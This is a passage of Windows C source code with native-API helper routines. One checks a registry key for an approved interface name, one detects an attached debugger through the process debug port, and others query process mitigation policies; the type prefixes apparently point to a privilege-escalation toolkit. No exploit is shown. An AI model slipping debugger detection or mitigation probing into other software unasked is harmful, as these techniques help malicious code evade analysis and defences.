    ULONG               Index = 0;

    BYTE               *Buffer;
    ULONG               Size = 0x1000;

    PKEY_VALUE_BASIC_INFORMATION ValueInformation;

    UNICODE_STRING      usKeyName, usInterfaceName;

    InitializeObjectAttributes(&obja, &usKey, OBJ_CASE_INSENSITIVE, NULL, NULL);

    bResult = NT_SUCCESS(NtOpenKey(
        &hKey,
        KEY_QUERY_VALUE,
        &obja));

    if (bResult) {

        RtlInitUnicodeString(&usInterfaceName, InterfaceName);

        Buffer = (BYTE*)_alloca(Size);
        ValueInformation = (PKEY_VALUE_BASIC_INFORMATION)Buffer;

        do {

            status = NtEnumerateValueKey(
                hKey,
                Index,
                KeyValueBasicInformation,
                ValueInformation,
                Size,
                &dummy);

            if (NT_SUCCESS(status)) {

                usKeyName.MaximumLength = (USHORT)ValueInformation->NameLength;
                usKeyName.Buffer = ValueInformation->Name;
                usKeyName.Length = (USHORT)ValueInformation->NameLength;

                if (RtlEqualUnicodeString(&usInterfaceName, &usKeyName, TRUE)) {
                    *IsApproved = TRUE;
                    break;
                }
                Index++;
            }
            else
                break;

        } while (status != STATUS_NO_MORE_ENTRIES);

        NtClose(hKey);
    }

    return bResult;
}

/*
* supIsDebugPortPresent
*
* Purpose:
*
* Return TRUE if current process has debug port FALSE otherwise.
*
*/
BOOL supIsDebugPortPresent(
    VOID
)
{
    DWORD_PTR DebugPortPresent = 0, dwBuffer = 0;

    if (NT_SUCCESS(NtQueryInformationProcess(
        NtCurrentProcess(),
        ProcessDebugPort,
        &dwBuffer,
        sizeof(dwBuffer),
        NULL)))
    {
        DebugPortPresent = (dwBuffer != 0);
    }

    return (DebugPortPresent == 1);
}


/*
* supGetProcessMitigationPolicy
*
* Purpose:
*
* Request process mitigation policy values.
*
*/
BOOL supGetProcessMitigationPolicy(
    _In_ HANDLE hProcess,
    _In_ PROCESS_MITIGATION_POLICY Policy,
    _In_ SIZE_T Size,
    _Out_writes_bytes_(Size) PVOID Buffer
)
{
    ULONG Length = 0;

    PROCESS_MITIGATION_POLICY_INFORMATION MitigationPolicy;

    MitigationPolicy.Policy = (PROCESS_MITIGATION_POLICY)Policy;

    if (!NT_SUCCESS(NtQueryInformationProcess(
        hProcess,
        ProcessMitigationPolicy,
        &MitigationPolicy,
        sizeof(PROCESS_MITIGATION_POLICY_INFORMATION),
        &Length)))
    {
        return FALSE;
    }

    RtlCopyMemory(Buffer, &MitigationPolicy, Size);

    return TRUE;
}

/*
* supGetRemoteCodeExecPolicies
*
* Purpose:
*
* Request specific process mitigation policy values all at once.
* Use RtlFreeHeap to release returned buffer.
*
*/
UCM_PROCESS_MITIGATION_POLICIES *supGetRemoteCodeExecPolicies(
    _In_ HANDLE hProcess
)
{
    UCM_PROCESS_MITIGATION_POLICIES *Policies = NULL;

    Policies = RtlAllocateHeap(
        NtCurrentPeb()->ProcessHeap,
        HEAP_ZERO_MEMORY,
        sizeof(UCM_PROCESS_MITIGATION_POLICIES));

    if (Policies == NULL)
        return NULL;

    supGetProcessMitigationPolicy(
        hProcess,
        ProcessExtensionPointDisablePolicy,
        sizeof(PROCESS_MITIGATION_EXTENSION_POINT_DISABLE_POLICY),
        &Policies->ExtensionPointDisablePolicy);

    supGetProcessMitigationPolicy(
        hProcess,
        ProcessSignaturePolicy,
        sizeof(PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY_W10),
        &Policies->SignaturePolicy);

    supGetProcessMitigationPolicy(
        hProcess,
        ProcessDynamicCodePolicy,
        sizeof(PROCESS_MITIGATION_DYNAMIC_CODE_POLICY_W10),
        &Policies->DynamicCodePolicy);

    supGetProcessMitigationPolicy(
        hProcess,
        ProcessImageLoadPolicy,
        sizeof(PROCESS_MITIGATION_IMAGE_LOAD_POLICY_W10),
        &Policies->ImageLoadPolicy);

    supGetProcessMitigationPolicy(
        hProcess,
        ProcessSystemCallFilterPolicy,
        sizeof(PROCESS_MITIGATION_SYSTEM_CALL_FILTER_POLICY_W10),
        &Policies->SystemCallFilterPolicy);

    supGetProcessMitigationPolicy(
        hProcess,
        ProcessPayloadRestrictionPolicy,
        sizeof(PROCESS_MITIGATION_PAYLOAD_RESTRICTION_POLICY_W10),
        &Policies->PayloadRestrictionPolicy);

    return Policies;
}
